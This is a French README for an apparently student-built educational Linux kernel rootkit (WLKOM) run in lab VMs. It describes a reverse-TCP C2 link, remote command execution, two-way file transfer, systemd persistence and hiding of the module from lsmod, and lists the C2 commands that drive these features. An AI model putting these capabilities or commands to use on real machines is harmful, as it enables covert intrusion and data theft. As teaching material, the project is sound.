# WLKOM — Wild Linux Kernel Object Module

Rootkit pédagogique Linux développé dans le cadre du projet SYS2 (EPITA).  
Module kernel (LKM) qui s'installe sur une machine victime, établit une connexion TCP persistante vers un programme attaquant, et exécute les commandes reçues.

**Documentation complète :** [https://piafarah.github.io/rootkit-sys2](https://piafarah.github.io/rootkit-sys2)  
*(Guide d'installation, code expliqué, décisions de conception, tests)*  
*Pour la consulter en local, voir [Documentation locale](#documentation-locale) ci-dessous.*

## Fonctionnalités

- Module kernel compilable avec `make`
- Connexion reverse TCP persistante vers le C2
- Authentification par hash FNV-1a non codé en dur
- Chiffrement symétrique des trames TCP C2/rootkit
- Exécution de commandes avec retour stdout, stderr et code de sortie
- Téléchargement de fichiers depuis la victime vers l'attaquant
- Téléversement de fichiers depuis l'attaquant vers la victime
- Persistance via `systemd` et `modprobe`
- Masquage automatique et réversible du module dans `lsmod` / `/proc/modules`

---

## Démarrage rapide

```bash
# Prérequis (machine hôte Arch Linux)
sudo pacman -S qemu-full cdrtools wget

# ── Sur la machine HÔTE ─────────────────────────────────────────────────────

# Copier les sources dans le dossier partagé (une seule fois)
cp -r rootkit/ vmshare/
cp -r attacking_program/ vmshare/

# Lancer les VMs (deux terminaux)
./vm.sh attacker   # terminal 1
./vm.sh victim     # terminal 2

# ── Terminal 3 : SSH vers la VM ATTAQUANTE ───────────────────────────────────
ssh -p 10023 epita@localhost   # mdp: epita

# Compiler et lancer le C2
cd /mnt/vmshare/attacking_program && make run

# ── Terminal 4 : SSH vers la VM VICTIME ─────────────────────────────────────
ssh -p 10022 epita@localhost   # mdp: epita

# Compiler le module
cd /mnt/vmshare/rootkit && make persistence

```

## Commandes C2

Après authentification, le C2 accepte les commandes shell classiques ainsi que des commandes internes dédiées au contrôle et aux transferts de fichiers :

```text
module_status                 # indique si wlkom est visible ou caché
hide_module                   # retire wlkom de lsmod et /proc/modules
unhide_module                 # réinsère wlkom dans la liste des modules
DOWNLOAD <remote_path> <local_path>
UPLOAD <local_path> <remote_path>
```

Le module se cache automatiquement au chargement. Avant `rmmod wlkom`, `make uninstall` ou toute désinstallation manuelle, lancer `unhide_module` depuis le C2 si le module est caché.

Exemples :

```text
DOWNLOAD /home/epita/test.txt /home/epita/from_victim.txt
UPLOAD /home/epita/local.txt /tmp/remote.txt
```

Si le mot de passe saisi est incorrect, le C2 affiche `Authentication failed`, ferme la session courante, puis attend la reconnexion automatique du rootkit. À la reconnexion, il redemande `WLKOM password:`.

## Capture réseau

Pour préparer une preuve Wireshark, capturer le trafic depuis la VM attaquante :

```bash
sudo tcpdump -i vmnet -nn -s0 -w /tmp/wlkom-c2.pcap tcp port 4444
```

Après la démo, copier la capture vers l'hôte :

```bash
cp /tmp/wlkom-c2.pcap /mnt/vmshare/wlkom-c2.pcap
```

Ouvrir ensuite `vmshare/wlkom-c2.pcap` dans Wireshark et utiliser `Follow TCP Stream`. Avec le chiffrement réseau activé, les commandes comme `ls /root`, les marqueurs `STDOUT` / `STDERR` et les sorties de commandes ne doivent plus apparaître en clair dans le flux.

## Structure

```
rootkit/           — module kernel LKM (wlkom.c, Makefile, install_persistence.sh)
attacking_program/ — programme C2 userland (c2.c, Makefile)
tests/             — tests automatisés Python (run_tests.py)
vm.sh              — script QEMU/KVM pour créer et lancer les VMs
vmshare/           — dossier partagé hôte ↔ VMs (VirtFS/9p)
docs/              — source de la documentation MkDocs
```

## Documentation locale

Prérequis : Python 3.

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -r docs-requirements.txt
mkdocs serve
```

Ouvrir [http://127.0.0.1:8000](http://127.0.0.1:8000). La page se recharge automatiquement à chaque modification dans `docs/`.

## Tests

```bash
python3 tests/run_tests.py
```

## Auteurs

Voir [AUTHORS](AUTHORS).
